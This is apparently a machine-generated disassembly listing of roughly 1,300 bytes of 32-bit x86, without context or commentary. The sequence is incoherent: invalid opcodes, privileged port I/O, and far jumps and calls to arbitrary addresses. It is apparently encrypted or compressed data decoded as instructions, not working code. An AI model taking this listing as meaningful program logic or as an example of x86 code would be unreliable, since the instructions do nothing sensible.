  41ce34:	xor    DWORD PTR [esi+ebx*4-0x35],0xffffffe5
  41ce39:	(bad)  
  41ce3a:	mov    ds:0xfa4b177,al
  41ce3f:	outs   dx,DWORD PTR ds:[esi]
  41ce40:	cmc    
  41ce41:	outs   dx,DWORD PTR ds:[esi]
  41ce42:	push   ds
  41ce43:	jbe    0x41ce0b
  41ce45:	cld    
  41ce46:	cmc    
  41ce47:	js     0x41ce58
  41ce49:	fstp   DWORD PTR [ecx+eax*2+0x2b61776]
  41ce50:	clc    
  41ce51:	das    
  41ce52:	xchg   edi,eax
  41ce53:	sub    eax,0x7672af28
  41ce58:	rol    BYTE PTR [ebx-0x34522362],0x98
  41ce5f:	sbb    DWORD PTR [ebx+0x3e],esp
  41ce62:	or     al,bl
  41ce64:	into   
  41ce65:	dec    ebx
  41ce66:	neg    BYTE PTR [esi-0x1c5b364e]
  41ce6c:	mov    edi,ebp
  41ce6e:	mov    cl,0x95
  41ce70:	loopne 0x41ce3d
  41ce72:	cld    
  41ce73:	push   ebx
  41ce74:	call   0x814:0x7d4c76ac
  41ce7b:	out    0x82,eax
  41ce7d:	mov    eax,0xbc9fa1f1
  41ce82:	sbb    al,0xa1
  41ce84:	mov    al,0xd0
  41ce86:	adc    al,0x78
  41ce88:	jg     0x41ceb0
  41ce8a:	popf   
  41ce8b:	push   es
  41ce8c:	sar    bh,cl
  41ce8e:	inc    edi
  41ce8f:	mov    ecx,0x502d9381
  41ce94:	mov    ecx,0x84f5ad8d
  41ce99:	je     0x41ce96
  41ce9b:	jle    0x41ced9
  41ce9d:	push   cs
  41ce9e:	ret    
  41ce9f:	mov    ah,dl
  41cea1:	and    DWORD PTR [ebp+0x60],ebx
  41cea4:	cdq    
  41cea5:	fdiv   QWORD PTR [esi+0x63efe412]
  41ceab:	jns    0x41ce56
  41cead:	mov    WORD PTR [edi],?
  41ceaf:	scas   al,BYTE PTR es:[edi]
  41ceb0:	pop    edi
  41ceb1:	sbb    bl,BYTE PTR [ebx-0x4dcc06a1]
  41ceb7:	inc    edi
  41ceb8:	pop    edi
  41ceb9:	cwde   
  41ceba:	mov    esp,0x6f301db8
  41cebf:	stc    
  41cec0:	nop
  41cec1:	outs   dx,DWORD PTR ds:[esi]
  41cec2:	pop    ebp
  41cec3:	cli    
  41cec4:	rcl    BYTE PTR [ebx],1
  41cec6:	das    
  41cec7:	in     al,0x50
  41cec9:	and    BYTE PTR fs:[eax],bh
  41cecc:	pushf  
  41cecd:	mov    WORD PTR [ecx-0x43],ds
  41ced0:	mov    ds:0x927e2832,al
  41ced5:	sti    
  41ced6:	or     cl,bl
  41ced8:	jmp    0x81cf750f
  41cedd:	call   0xdd46d765
  41cee2:	(bad)  
  41cee3:	outs   dx,BYTE PTR ds:[esi]
  41cee4:	mov    edi,0xb43a0ad4
  41cee9:	cs xchg edx,eax
  41ceeb:	sbb    al,0x4a
  41ceed:	in     eax,dx
  41ceee:	xchg   ecx,eax
  41ceef:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cef0:	push   cs
  41cef1:	push   ds
  41cef2:	(bad)
  41cef5:	call   0x3fdb:0xb9d15bd0
  41cefc:	mov    ah,0xab
  41cefe:	retf   
  41ceff:	mov    esi,0x345e80c8
  41cf04:	mov    esp,0x8b62803a
  41cf09:	sbb    al,0xa0
  41cf0b:	pop    edi
  41cf0c:	pop    ebp
  41cf0d:	cmc    
  41cf0e:	cmp    edi,DWORD PTR [ebx+ecx*2]
  41cf11:	sub    al,0xfa
  41cf13:	(bad)  
  41cf15:	sub    bh,BYTE PTR [esp+ebx*1+0x7712fd8f]
  41cf1c:	mov    al,0x10
  41cf1e:	out    0xda,al
  41cf20:	ins    DWORD PTR es:[edi],dx
  41cf21:	sahf   
  41cf22:	neg    BYTE PTR [eax+ebp*4+0x4a40e051]
  41cf29:	jmp    0x41cf01
  41cf2b:	sub    DWORD PTR [esi+0x57bf1134],ebx
  41cf31:	dec    edi
  41cf32:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cf33:	mov    esp,0x76fc443
  41cf39:	popf   
  41cf3a:	or     eax,0x5aac8f9
  41cf3f:	adc    eax,0xecda81da
  41cf44:	popf   
  41cf45:	pop    ss
  41cf46:	pop    edi
  41cf47:	lahf   
  41cf48:	add    BYTE PTR [ebp+0xc4ff878],ah
  41cf4e:	cmp    BYTE PTR [esi],ah
  41cf50:	(bad)  
  41cf51:	aaa    
  41cf52:	inc    ebx
  41cf53:	int    0x60
  41cf55:	mov    dl,0x47
  41cf57:	ins    BYTE PTR es:[edi],dx
  41cf58:	jmp    0xa4abd478
  41cf5d:	out    0x16,eax
  41cf5f:	and    DWORD PTR ds:0xdceee5a1,edi
  41cf65:	push   0xa6faf91e
  41cf6a:	int    0xbf
  41cf6c:	cwde   
  41cf6d:	xchg   ecx,eax
  41cf6e:	xchg   edi,eax
  41cf6f:	xchg   esp,eax
  41cf70:	mov    esp,0xa88bc33a
  41cf75:	push   es
  41cf76:	sbb    al,0x4
  41cf78:	repnz push cs
  41cf7a:	dec    ecx
  41cf7b:	frstor [edx-0x7efdcd3]
  41cf81:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cf82:	pop    ebp
  41cf83:	into   
  41cf84:	sbb    al,BYTE PTR [edx-0x5fb939f9]
  41cf8a:	outs   dx,BYTE PTR ds:[esi]
  41cf8b:	add    al,0x16
  41cf8d:	call   0x46e9:0xcf55169a
  41cf94:	push   ebp
  41cf95:	sbb    DWORD PTR [ebx],esi
  41cf97:	mov    ah,0xdb
  41cf99:	popf   
  41cf9a:	retf   0xa573
  41cf9d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cf9e:	add    edx,esp
  41cfa0:	(bad)  
  41cfa1:	nop
  41cfa2:	sbb    ch,bl
  41cfa4:	jp     0x41cfeb
  41cfa6:	retf   
  41cfa7:	lea    edx,[esi+eiz*4-0x242b1936]
  41cfae:	stos   BYTE PTR es:[edi],al
  41cfaf:	pushf  
  41cfb0:	sbb    al,bh
  41cfb2:	pop    esp
  41cfb3:	enter  0x39dc,0x5d
  41cfb7:	sbb    BYTE PTR [ebx],bl
  41cfb9:	dec    eax
  41cfba:	dec    esi
  41cfbb:	or     edx,edx
  41cfbd:	sbb    dh,BYTE PTR [esi]
  41cfbf:	mov    eax,0x67eb6a2f
  41cfc4:	aas    
  41cfc5:	outs   dx,BYTE PTR ds:[esi]
  41cfc6:	and    eax,0x6442cbcb
  41cfcb:	into   
  41cfcc:	rcr    DWORD PTR [edx-0x72],0x56
  41cfd0:	and    BYTE PTR [ebx+esi*2],bh
  41cfd3:	adc    al,BYTE PTR [edi-0x41]
  41cfd6:	popa   
  41cfd7:	jnp    0x41cfc8
  41cfd9:	push   ds
  41cfda:	xor    al,0x7c
  41cfdc:	inc    DWORD PTR [eax-0x63e427d1]
  41cfe2:	test   DWORD PTR [edx+eiz*4+0x29eb721f],edi
  41cfe9:	int3   
  41cfea:	or     BYTE PTR [ebp+0x38],cl
  41cfed:	xor    dh,BYTE PTR ds:0xdd115dae
  41cff3:	mov    edi,?
  41cff5:	lahf   
  41cff6:	adc    esp,DWORD PTR [esi-0x56a8b87e]
  41cffc:	mov    ah,0xba
  41cffe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cfff:	out    dx,eax
  41d000:	cmc    
  41d001:	mov    BYTE PTR [esi-0x62f18d51],cl
  41d007:	imul   esi,DWORD PTR [eax+0x75568192],0x5c940f78
  41d011:	iret   
  41d012:	outs   dx,DWORD PTR ds:[esi]
  41d013:	jle    0x41d00b
  41d015:	int3   
  41d016:	add    bl,BYTE PTR [esi+0x45]
  41d019:	adc    BYTE PTR [esi],ch
  41d01b:	loope  0x41d00a
  41d01d:	pop    ds
  41d01e:	(bad)  
  41d020:	bswap  ecx
  41d022:	cmp    al,0x98
  41d024:	or     dh,BYTE PTR [ebx]
  41d026:	outs   dx,BYTE PTR ds:[esi]
  41d027:	enter  0x65c4,0x49
  41d02b:	dec    edi
  41d02c:	adc    eax,0xc4791e8b
  41d031:	dec    esi
  41d032:	inc    ebp
  41d033:	fsubr  QWORD PTR [edi+0x1331498b]
  41d039:	dec    edx
  41d03a:	inc    edi
  41d03b:	mov    esi,0x2f02d2a2
  41d040:	push   cs
  41d041:	in     eax,dx
  41d042:	scas   eax,DWORD PTR es:[edi]
  41d043:	sbb    ah,BYTE PTR [edi+0x12]
  41d046:	add    BYTE PTR [edx],cl
  41d048:	mov    bh,0x71
  41d04a:	repnz push ecx
  41d04c:	iret   
  41d04d:	ror    DWORD PTR [edx+0x5],1
  41d050:	mov    ah,0xcc
  41d052:	adc    BYTE PTR [edi+0x8f4521d],bh
  41d058:	xchg   esi,eax
  41d059:	adc    al,BYTE PTR [edx-0x55]
  41d05c:	retf   
  41d05d:	pop    esi
  41d05e:	mov    ah,0x5f
  41d060:	cli    
  41d061:	(bad)  [ebp+0x100a7c92]
  41d067:	sbb    al,0x8f
  41d069:	pop    ss
  41d06a:	jle    0x41d001
  41d06c:	xchg   edx,edx
  41d06e:	mov    ah,0xcc
  41d070:	pop    esp
  41d071:	call   0x8359:0xed7c27ba
  41d078:	mov    dl,bl
  41d07a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d07b:	pushf  
  41d07c:	not    DWORD PTR [eax]
  41d07e:	push   esp
  41d07f:	test   al,0x6a
  41d081:	xlat   BYTE PTR ds:[ebx]
  41d082:	sbb    ecx,esi
  41d084:	mov    cs,WORD PTR [ecx+ecx*1-0x15716396]
  41d08b:	and    eax,DWORD PTR [esi-0x497f4b02]
  41d091:	sbb    ch,BYTE PTR [edx]
  41d093:	mov    esi,0x1f87ab24
  41d098:	in     al,0xf2
  41d09a:	jnp    0x41d10f
  41d09c:	call   0x684a:0xbffae242
  41d0a3:	fldenv [eax-0x9]
  41d0a6:	int3   
  41d0a7:	rcr    esi,1
  41d0a9:	add    esp,DWORD PTR [edi]
  41d0ab:	mov    ebp,0xa41b124
  41d0b0:	jmp    0x41d035
  41d0b2:	scas   al,BYTE PTR es:[edi]
  41d0b3:	or     dh,BYTE PTR [ecx+eax*2]
  41d0b6:	jmp    0xc0fb:0x4172ece0
  41d0bd:	clc    
  41d0be:	mov    WORD PTR ds:[eax-0x45ba12cf],es
  41d0c5:	fst    DWORD PTR [edx-0x35]
  41d0c8:	ins    DWORD PTR es:[edi],dx
  41d0c9:	push   ds
  41d0ca:	rcl    BYTE PTR [ebx],1
  41d0cc:	and    bl,BYTE PTR [ebp+0x52c8e12d]
  41d0d2:	pop    edx
  41d0d3:	in     eax,0x31
  41d0d5:	cmp    al,0x99
  41d0d7:	rcr    BYTE PTR [ebx-0x5d],1
  41d0da:	cmp    eax,0xccb53413
  41d0df:	mov    bl,0xfc
  41d0e1:	mov    dh,0x4e
  41d0e3:	add    al,0x8a
  41d0e5:	bound  edi,QWORD PTR [ebp-0xd]
  41d0e8:	adc    al,0xd
  41d0ea:	mov    BYTE PTR [edi],cl
  41d0ec:	cli    
  41d0ed:	xor    BYTE PTR [esi-0x73a6b142],al
  41d0f3:	data16 clc 
  41d0f5:	lss    ebx,FWORD PTR [esi+0x19202100]
  41d0fc:	pop    esp
  41d0fd:	push   ecx
  41d0fe:	jnp    0x41d162
  41d100:	jb     0x41d121
  41d102:	lods   al,BYTE PTR ds:[esi]
  41d103:	xchg   al,dl
  41d105:	clc    
  41d106:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d107:	cdq    
  41d108:	(bad)  
  41d109:	stos   DWORD PTR es:[edi],eax
  41d10a:	dec    edx
  41d10b:	pusha  
  41d10c:	mov    es,eax
  41d10e:	cmp    al,0x31
  41d110:	xchg   BYTE PTR [eax+0x79],dh
  41d113:	(bad)  
  41d114:	ins    DWORD PTR es:[edi],dx
  41d115:	lock push 0xffffffa6
  41d118:	mov    ebx,0xc7a021d7
  41d11d:	sub    dh,ah
  41d11f:	in     eax,dx
  41d120:	sahf   
  41d121:	ret    0x3d3c
  41d124:	mov    eax,ds:0xcfc5d1e7
  41d129:	jl     0x41d1a6
  41d12b:	(bad)  
  41d12c:	jns    0x41d0b6
  41d12e:	scas   eax,DWORD PTR es:[edi]
  41d12f:	aas    
  41d130:	outs   dx,DWORD PTR ds:[esi]
  41d131:	sub    DWORD PTR [ecx-0x70],ecx
  41d134:	inc    ebp
  41d135:	jmp    0x41d178
  41d137:	mov    al,BYTE PTR [edi]
  41d139:	jne    0x41d0ec
  41d13b:	mov    ebx,0xa82f4d48
  41d140:	(bad)  
  41d141:	enter  0xf6a5,0xbb
  41d145:	cmp    edi,DWORD PTR [ecx]
  41d147:	mov    dh,0x3a
  41d149:	dec    edi
  41d14a:	xchg   cl,bl
  41d14c:	outs   dx,DWORD PTR ds:[esi]
  41d14d:	push   ecx
  41d14e:	shr    DWORD PTR [eax-0x7015677a],0xa6
  41d155:	xor    bl,0x51
  41d158:	and    esp,eax
  41d15a:	sbb    dl,BYTE PTR [ecx+ebp*8-0x3c]
  41d15e:	jae    0x41d17f
  41d160:	shl    BYTE PTR [esi+ecx*1-0x670b1e9d],cl
  41d167:	and    esp,esi
  41d169:	mov    WORD PTR [edx],?
  41d16b:	mov    dl,0x6c
  41d16d:	or     esp,DWORD PTR [esi+0x7b]
  41d170:	mov    WORD PTR [eax-0x2e5bc6ec],ds
  41d176:	mov    bl,0x9d
  41d178:	aaa    
  41d179:	pop    ebp
  41d17a:	test   DWORD PTR [ebx],edi
  41d17c:	das    
  41d17d:	sbb    ebx,DWORD PTR [edx-0x2d]
  41d180:	mov    ds:0x452a2464,al
  41d185:	out    0x1d,eax
  41d187:	cmp    DWORD PTR [esi],esp
  41d189:	xor    BYTE PTR [ebx+0x15],al
  41d18c:	lea    esp,ds:0x98bad560
  41d192:	push   edx
  41d193:	pop    ecx
  41d194:	cmp    bl,BYTE PTR [eax+0x1a]
  41d197:	sbb    bh,ah
  41d199:	inc    eax
  41d19a:	inc    esi
  41d19b:	mov    ds:0x26a11e20,eax
  41d1a0:	mov    ch,0x8b
  41d1a2:	mov    ebp,0xa3465a24
  41d1a7:	push   0x1c
  41d1a9:	adc    BYTE PTR ds:0xe003d8b,cl
  41d1af:	sbb    esi,DWORD PTR [ecx+0x27]
  41d1b2:	nop
  41d1b3:	ror    DWORD PTR [ecx+0x5bab0ee4],1
  41d1b9:	(bad)  
  41d1ba:	or     eax,0xb7b2fef4
  41d1bf:	imul   ebx,DWORD PTR [eax-0x294b563e],0x1a
  41d1c6:	daa    
  41d1c7:	cmp    WORD PTR [edi-0x43],dx
  41d1cb:	jl     0x41d171
  41d1cd:	(bad)  
  41d1ce:	das    
  41d1cf:	jb     0x41d1eb
  41d1d1:	(bad)  
  41d1d2:	das    
  41d1d3:	dec    esi
  41d1d4:	lahf   
  41d1d5:	ins    BYTE PTR es:[edi],dx
  41d1d6:	outs   dx,BYTE PTR ds:[esi]
  41d1d7:	mov    ebp,0x91daa28c
  41d1dc:	cmp    BYTE PTR [ebp+0x2f912e2e],ah
  41d1e2:	xor    eax,0x9034c54b
  41d1e7:	mov    ecx,0x4b82fcc8
  41d1ec:	mov    BYTE PTR [ecx-0x5eef7586],0xa4
  41d1f3:	lock leave 
  41d1f5:	(bad)  
  41d1f6:	(bad)  
  41d1f7:	sub    DWORD PTR [edi+0xb],0x51b0c7b6
  41d1fe:	add    ebx,DWORD PTR [edi+0x51125e6]
  41d204:	push   ss
  41d205:	or     ecx,DWORD PTR [ebx+esi*1-0x57]
  41d209:	fbstp  TBYTE PTR [ebx-0x156d2ac0]
  41d20f:	and    ah,BYTE PTR [eax+0xc355278]
  41d215:	or     ch,cl
  41d217:	xor    BYTE PTR [edi-0x4f18418b],ah
  41d21d:	lahf   
  41d21e:	fst    DWORD PTR [ebp+ebp*4-0x7db2333c]
  41d225:	neg    DWORD PTR [esi-0x4188252a]
  41d22b:	mov    ebp,0x8d0117a8
  41d230:	inc    edi
  41d231:	and    eax,0x950ea55d
  41d236:	xchg   esp,eax
  41d237:	(bad)  
  41d238:	(bad)  
  41d239:	stos   BYTE PTR es:[edi],al
  41d23a:	jno    0x41d225
  41d23c:	ins    BYTE PTR es:[edi],dx
  41d23d:	and    ah,cl
  41d23f:	in     al,0x77
  41d241:	ins    DWORD PTR es:[edi],dx
  41d242:	or     BYTE PTR [eax],bh
  41d244:	nop
  41d245:	aad    0x27
  41d247:	jnp    0x41d26c
  41d249:	shl    BYTE PTR [esi-0x30],0x57
  41d24d:	jecxz  0x41d1d0
  41d24f:	call   0x42a07391
  41d254:	xor    dh,BYTE PTR ds:0xe7a45fd
  41d25a:	jnp    0x41d25f
  41d25c:	nop
  41d25d:	dec    esp
  41d25e:	pop    es
  41d25f:	je     0x41d1ea
  41d261:	inc    eax
  41d262:	pop    ss
  41d263:	pop    edx
  41d264:	arpl   WORD PTR ds:0xc67683c8,sp
  41d26a:	jp     0x41d1fa
  41d26c:	adc    ecx,DWORD PTR [edi]
  41d26e:	(bad)  
  41d26f:	mov    al,ds:0xf90c07bd
  41d274:	jle    0x41d27d
  41d276:	xor    DWORD PTR [edx+ebx*4+0x52],esp
  41d27a:	bound  edi,QWORD PTR ds:0x5444452f
  41d280:	outs   dx,BYTE PTR ds:[esi]
  41d281:	push   ds
  41d282:	sub    DWORD PTR [edx-0x6f693932],eax
  41d288:	mov    eax,ds:0x4c466a0b
  41d28d:	cmp    edi,DWORD PTR [ecx+eiz*2]
  41d290:	pusha  
  41d291:	outs   dx,BYTE PTR ds:[esi]
  41d292:	in     eax,dx
  41d293:	stos   DWORD PTR es:[edi],eax
  41d294:	push   ecx
  41d295:	sbb    BYTE PTR [eax-0x59],al
  41d298:	adc    bh,bl
  41d29a:	ss pop esi
  41d29c:	mov    al,ds:0xc3ac82e
  41d2a1:	jp     0x41d2e9
  41d2a3:	mov    ecx,0x9f5e50f0
  41d2a8:	inc    ecx
  41d2a9:	mov    ah,0xa6
  41d2ab:	ins    BYTE PTR es:[edi],dx
  41d2ac:	into   
  41d2ad:	sbb    DWORD PTR [bx+si],edx
  41d2b0:	(bad)  
  41d2b1:	push   ecx
  41d2b2:	mov    al,ds:0x45ad4b24
  41d2b7:	mov    dl,0xba
  41d2b9:	(bad)  
  41d2ba:	and    eax,0x33ba8326
  41d2bf:	sti    
  41d2c0:	cmp    bh,dh
  41d2c2:	lds    esp,FWORD PTR [esi+0x1fc0f0a2]
  41d2c8:	mov    bl,BYTE PTR [edi]
  41d2ca:	fs or  edi,ecx
  41d2cd:	inc    edx
  41d2ce:	jp     0x41d2b2
  41d2d0:	jecxz  0x41d27a
  41d2d2:	div    DWORD PTR [ecx-0x7b]
  41d2d5:	jo     0x41d320
  41d2d7:	cmc    
  41d2d8:	push   ds
  41d2d9:	clc    
  41d2da:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d2db:	mov    bh,0x20
  41d2dd:	loopne 0x41d2a5
  41d2df:	(bad)  
  41d2e0:	inc    DWORD PTR [esp+esi*8+0x1]
  41d2e4:	sti    
  41d2e5:	pop    esi
  41d2e6:	sub    dh,BYTE PTR [ebx]
  41d2e8:	test   DWORD PTR [edx-0x5a7066a6],0xef9cfb2d
  41d2f2:	cmp    al,al
  41d2f4:	mov    ebp,0xfe6d9cb4
  41d2f9:	xchg   ebx,eax
  41d2fa:	or     BYTE PTR [ecx+0xc5227ea],dh
  41d300:	ds adc al,0xa0
  41d303:	stc    
  41d304:	int3   
  41d305:	jmp    0x26f1:0x78299830
  41d30c:	popf   
  41d30d:	dec    edx
  41d30e:	sahf   
  41d30f:	lea    edx,[ecx-0x67b269ed]
  41d315:	stc    
  41d316:	mov    bl,al
  41d318:	les    ebp,FWORD PTR [esi+0x2a2e426]
  41d31e:	mov    al,0x35
  41d320:	mov    BYTE PTR [ebp+0xec55e2a],bl
  41d326:	fwait
  41d327:	mov    ch,0x68
  41d329:	ret    
  41d32a:	adc    al,0x37
  41d32c:	in     al,dx
  41d32d:	mov    cl,0xf8
  41d32f:	std    
  41d330:	pop    esi
  41d331:	fbstp  TBYTE PTR [esi-0x120e8999]
  41d337:	inc    edx
  41d338:	popa   
  41d339:	dec    esi
  41d33a:	inc    esi
  41d33b:	jp     0x41d2d0
  41d33d:	dec    esi
  41d33e:	test   al,0x37
  41d340:	shr    DWORD PTR [esi],1
  41d342:	data16 aaa 
  41d344:	sbb    edx,DWORD PTR [eax-0xd]
  41d347:	cmp    esp,0x61afa451
  41d34d:	xchg   edi,eax
  41d34e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d34f:	ror    al,1
  41d351:	push   ebp
  41d352:	data16 daa 
  41d354:	in     al,dx
  41d355:	ins    DWORD PTR es:[edi],dx
  41d356:	or     bh,BYTE PTR [ecx-0xc9e21e9]
  41d35c:	inc    esp
  41d35d:	cmp    al,0x90
  41d35f:	iret   
  41d360:	and    DWORD PTR [edx],esi
  41d362:	mov    esp,0xc2a1ee91
  41d367:	shl    DWORD PTR [ecx+0x1b],1
  41d36a:	nop
  41d36b:	adc    eax,0x363a4376
  41d370:	add    al,0x26
  41d372:	repnz xchg edi,eax
  41d374:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d375:	inc    edi
  41d376:	xchg   ebx,eax
  41d377:	add    BYTE PTR [ebp-0x47],cl
  41d37a:	stos   DWORD PTR es:[edi],eax
  41d37b:	mov    ds:0x51d8670,al
  41d380:	adc    cl,BYTE PTR [esi+0x7d13922f]
  41d386:	sbb    bh,BYTE PTR [esi]
  41d388:	inc    edi
  41d389:	sti    
  41d38a:	scas   eax,DWORD PTR es:[edi]
  41d38b:	rcl    BYTE PTR [esi-0x7141059e],0x14
  41d392:	shl    edi,1
  41d394:	cmp    al,0x1c
  41d396:	inc    esp
  41d397:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d398:	mov    bl,0xe1
  41d39a:	retf   
  41d39b:	dec    edi
  41d39c:	retf   
  41d39d:	cdq    
  41d39e:	mov    BYTE PTR [edx-0x37],bl
  41d3a1:	idiv   DWORD PTR [esi-0x2c]
  41d3a4:	(bad)  
  41d3a5:	stos   BYTE PTR es:[edi],al
  41d3a6:	cmp    dl,BYTE PTR [ecx]
  41d3a8:	adc    ah,BYTE PTR ds:0x9e1a873e
  41d3ae:	cdq    
  41d3af:	call   0x91f7:0x75b16550
  41d3b6:	push   esi
  41d3b7:	push   ebx
  41d3b8:	cs mov edi,0xf0ee8c3b
  41d3be:	push   cs
  41d3bf:	xchg   edx,eax
  41d3c0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d3c1:	mov    dl,ch
  41d3c3:	mov    ebx,0x8601173c
  41d3c8:	pusha  
  41d3c9:	daa    
  41d3ca:	sti    
  41d3cb:	sub    al,BYTE PTR [ebx+edi*2+0x44]
  41d3cf:	aas    
  41d3d0:	jp     0x41d3d6
  41d3d2:	test   eax,0x335e96bd
  41d3d7:	fsub   QWORD PTR [esi-0x2f]
  41d3da:	in     eax,0x26
  41d3dc:	mov    ch,0x1e
  41d3de:	push   ebx
  41d3df:	sub    eax,0x24f9d889
  41d3e4:	xlat   BYTE PTR ds:[ebx]
  41d3e5:	jl     0x41d37b
  41d3e7:	push   0x27d045c6
  41d3ec:	cli    
  41d3ed:	cs dec edi
  41d3ef:	imul   BYTE PTR [ebx-0x128cbc9a]
  41d3f5:	mov    al,BYTE PTR [edx-0x27519881]
  41d3fb:	mov    WORD PTR [ebx],fs
  41d3fd:	mov    eax,DWORD PTR [edi+0x6a0d5b9]
  41d403:	stos   BYTE PTR es:[edi],al
  41d404:	std    
  41d405:	pop    eax
  41d406:	leave  
  41d407:	cmp    ecx,ebx
  41d409:	jno    0x41d3a4
  41d40b:	fisttp DWORD PTR [ebp-0x7a]
  41d40e:	aad    0x55
  41d410:	push   edi
  41d411:	xlat   BYTE PTR ds:[ebx]
  41d412:	out    dx,eax
  41d413:	les    ebp,FWORD PTR [esi-0x5e]
  41d416:	mov    dh,0x25
  41d418:	fcom   DWORD PTR [ebp+0x5498f5ff]
  41d41e:	push   esi
  41d41f:	dec    esp
  41d420:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d421:	stc    
  41d422:	retf   0xb56e
  41d425:	in     eax,0xc9
  41d427:	mov    dl,0x74
  41d429:	repnz out 0x56,al
  41d42c:	clc    
  41d42d:	dec    ecx
  41d42e:	dec    eax
  41d42f:	and    al,0x25
  41d431:	dec    esi
  41d432:	cs iret 
  41d434:	pop    esi
  41d435:	out    0xde,al
  41d437:	in     al,dx
  41d438:	add    eax,0x6c3b989b
  41d43d:	mov    edx,ebp
  41d43f:	xchg   esi,eax
  41d440:	repnz imul ebp,DWORD PTR [edx],0xffffffaf
  41d444:	stos   DWORD PTR es:[edi],eax
  41d445:	sub    eax,DWORD PTR [eax+edi*8+0xeb3f2e6]
  41d44c:	mov    esp,0x8296088b
  41d451:	and    esi,DWORD PTR [ecx+0x49]
  41d454:	sub    BYTE PTR [ecx-0x29],ah
  41d457:	data16 in al,dx
  41d459:	jne    0x41d4b0
  41d45b:	mov    edi,0x2454e9ba
  41d460:	outs   dx,DWORD PTR ds:[esi]
  41d461:	fild   DWORD PTR [esi-0x39]
  41d464:	push   ss
  41d465:	mov    cl,0xc
  41d467:	and    al,0x80
  41d469:	pop    edi
  41d46a:	cmp    bp,0x34
  41d46e:	stos   DWORD PTR es:[edi],eax
  41d46f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d470:	xchg   edi,eax
  41d471:	(bad)  
  41d472:	rcr    BYTE PTR [esi+0x2e59eb34],1
  41d478:	jno    0x41d4d5
  41d47a:	les    edi,FWORD PTR [ecx]
  41d47c:	jno    0x41d4a6
  41d47e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d47f:	scas   al,BYTE PTR es:[edi]
  41d480:	add    edx,ecx
  41d482:	mov    dh,0x76
  41d484:	xchg   ecx,eax
  41d485:	dec    ebp
  41d486:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d487:	pop    ebp
  41d488:	or     ebp,ebx
  41d48a:	fist   DWORD PTR [edi+edi*1-0x6f]
  41d48e:	push   ss
  41d48f:	jne    0x41d50c
  41d491:	push   ebx
  41d492:	ret    
  41d493:	loop   0x41d501
  41d495:	adc    DWORD PTR [ebx-0x2807481c],edi
  41d49b:	mov    al,ds:0xec93ad2b
  41d4a0:	aaa    
  41d4a1:	leave  
  41d4a2:	aam    0x1
  41d4a4:	sbb    DWORD PTR [edi],0x51
  41d4a7:	push   0xffffff9c
  41d4a9:	sbb    al,BYTE PTR [ecx-0x467997e6]
  41d4af:	inc    ebp
  41d4b0:	mov    ebx,0x3416bdfa
  41d4b5:	hlt    
  41d4b6:	out    0x55,eax
  41d4b8:	retf   
  41d4b9:	or     ebx,DWORD PTR [eax+eax*1+0x5bd499cb]
  41d4c0:	sti    
  41d4c1:	pushf  
  41d4c2:	cmp    eax,0x7e1a5272
  41d4c7:	clc    
  41d4c8:	pop    es
  41d4c9:	jno    0x41d4e2
  41d4cb:	push   eax
  41d4cc:	push   ecx
  41d4cd:	(bad)  
  41d4ce:	pop    ebx
  41d4cf:	pop    ebp
  41d4d0:	test   eax,0xce695ad3
  41d4d5:	mov    al,0xbf
  41d4d7:	mov    esp,ecx
  41d4d9:	sbb    eax,0xe387db7
  41d4de:	or     al,0x9e
  41d4e0:	(bad)  
  41d4e1:	out    dx,eax
  41d4e2:	hlt    
  41d4e3:	imul   ecx,DWORD PTR [edi+eiz*4+0x2f],0x6a
  41d4e8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d4e9:	push   ds
  41d4ea:	retf   0x694a
  41d4ed:	test   eax,0x4f3c2f13
  41d4f2:	shl    DWORD PTR [ecx+edx*2+0x3e97dcf4],cl
  41d4f9:	paddw  mm2,mm1
  41d4fc:	std    
  41d4fd:	fidiv  DWORD PTR [eax+0x1b]
  41d500:	and    eax,0xb49b605d
  41d505:	in     al,dx
  41d506:	je     0x41d510
  41d508:	cli    
  41d509:	dec    ebx
  41d50a:	jecxz  0x41d4ec
  41d50c:	into   
  41d50d:	bound  ebp,QWORD PTR [edi]
  41d50f:	and    DWORD PTR [ebx],edi
  41d511:	mov    ebx,0xeddd5c61
  41d516:	cmp    BYTE PTR [ebp-0x50],dl
  41d519:	div    BYTE PTR [ecx+0x3]
  41d51c:	je     0x41d4c3
  41d51e:	fidiv  DWORD PTR [ecx]
  41d520:	int    0xc1
  41d522:	mov    ebx,0x689bde88
  41d527:	mov    ds:0x3fdb1d0a,eax
  41d52c:	outs   dx,DWORD PTR ds:[esi]
  41d52d:	js     0x41d4da
  41d52f:	jge    0x41d545
  41d531:	push   edi
  41d532:	sbb    ch,BYTE PTR [ebp+0x6d]
  41d535:	dec    edi
  41d536:	repz ror dl,1
  41d539:	idiv   ecx
  41d53b:	ins    BYTE PTR es:[edi],dx
  41d53c:	aas    
  41d53d:	mov    cl,0xf3
  41d53f:	test   BYTE PTR [eax],0x9c
  41d542:	repz test eax,0x95163642
  41d548:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d549:	xchg   edi,eax
  41d54a:	pushf  
  41d54b:	or     bh,BYTE PTR [esi]
  41d54d:	lea    edi,[ecx]
  41d54f:	int3   
  41d550:	sub    ebx,DWORD PTR [ebx+ebx*1]
  41d553:	or     bh,BYTE PTR [ebx-0xc]
  41d556:	retf   0x518a
  41d559:	add    dl,BYTE PTR ds:0xa8fc32be
  41d55f:	or     eax,0x190f0ee7
  41d564:	lds    ecx,FWORD PTR [edx]
  41d566:	stos   BYTE PTR es:[edi],al
  41d567:	inc    cx
  41d569:	add    al,0xf8
